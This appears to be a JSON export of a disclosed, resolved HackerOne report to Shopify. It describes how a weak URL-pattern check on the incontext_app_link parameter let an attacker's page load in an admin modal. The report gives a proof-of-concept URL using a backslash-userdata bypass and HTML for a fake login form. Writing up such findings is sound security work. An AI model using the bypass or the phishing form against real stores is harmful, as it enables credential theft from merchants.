{
  "id": 422279,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjIyNzk=",
  "url": "https://hackerone.com/reports/422279",
  "title": "H1514 Simple phishing using auto-created modal with weak URL-pattern check in incontext_app_link",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-10-11T00:37:43.811Z",
  "submitted_at": "2018-10-11T00:37:43.811Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "fransrosen",
    "url": "/fransrosen",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-04-10T22:35:47.817Z",
  "bug_reporter_agreed_on_going_public_at": "2019-04-10T22:35:47.685Z",
  "team_member_agreed_on_going_public_at": "2019-04-10T18:19:33.553Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\n\nThis is unrelated to the Twine-template issue reported earlier as this would still be an issue if the template escape would be fixed. \n\n### Background\n\nThe `incontext_app_link` is checked server-side if it's a correct `shopifycloud.com`-URL. The problem however is that userdata inside the URL is allowed. By utilizing two backslashes `\\\\` in the userdata, we're able to make all browsers except Safari load the URL before the `@` instead of the domain after. This means that since the `API.modal.open` triggers directly when the victim accesses the page, we can fake a login page on this URL to make the admin think they need to reauthorize in Shopify. However, the link is actually loaded from a different domain and the credentials will be stolen whenever the admins uses the form.\n\nThe same thing applies here as to the Twine-report, the attacker needs to use a product-ID that exists for the merchant. But since these IDs are publicly available in the webstore, this should be no issue.\n\n### PoC\n\nPoC-link (use your own store, and also replace `1557454323768` with a working Product ID inside your store):\n\n```\n/admin/products/1557454323768?incontext_app_link=https%3A%2F%2F████████%5C%5C%40google-shopping.shopifycloud.com\n```\n\nThe following HTML is loaded from `██████`:\n\n\n```html\n<center>\n<form onsubmit=\"alert('your login is: ' + document.getElementById('u').value + ':' + document.getElementById('p').value); return false\">\n<input id=\"u\" placeholder=\"Email address\" style=\" position: absolute; top: 140px; left: 80px; font-size: 20px; height: 50px; border: 0; width: 400px;\">\n<input id=\"p\" placeholder=\"Password\" type=\"password\" style=\"position: absolute; font-size: 20px; height: 50px; border: 0; width: 400px; left: 80px; top: 210px;\">\n<button type=\"submit\" style=\"position: absolute; left: 80px; height: 50px; top: 280px; width: 480px; background: transparent; border: 0;\"></button></form>\n<img src=\"login.png\" width=\"600\" /></center>\n<script>parent.postMessage('{\"message\":\"Shopify.API.Modal.setHeight\",\"data\":{\"height\":500,\"width\":\"940\"}}','*')</script>\n```\n\n{F358706}\n\nHere's a video showing the scenario of the attacker sending a link to an admin:\n\n{F358705}\n\nRegards,\nFrans and Mathias\n\n## Impact\n\n#",
  "bounty_amount": "1837.0",
  "formatted_bounty": "$1,837",
  "weakness": {
    "id": 65,
    "name": "Business Logic Errors"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 22,
  "voters": [
    "samengmg",
    "drsniper",
    "sp1d3rs",
    "tess",
    "ali",
    "terjanq",
    "already_in_use_",
    "r0hack",
    "8redtriangle2",
    "cr4xerbik4sh",
    "and 12 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.4,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 413,
    "asset_type": "URL",
    "asset_identifier": "your-store.myshopify.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 14195,
      "category": "team",
      "content": "@fransrosen and @avlidienbrunn found that it was possible to inject arbitrary content from other domains into the products page in admin via the incontext_app_link parameter. This content was intended to be limited to the domains of installed apps, but this bug would have allowed any URL to load content in a modal inside Shopify admin.",
      "user": {
        "id": 75410,
        "username": "jenn-shopify",
        "name": "jenn",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2016-05-09T18:26:09.949Z",
        "url": "https://hackerone.com/jenn-shopify",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
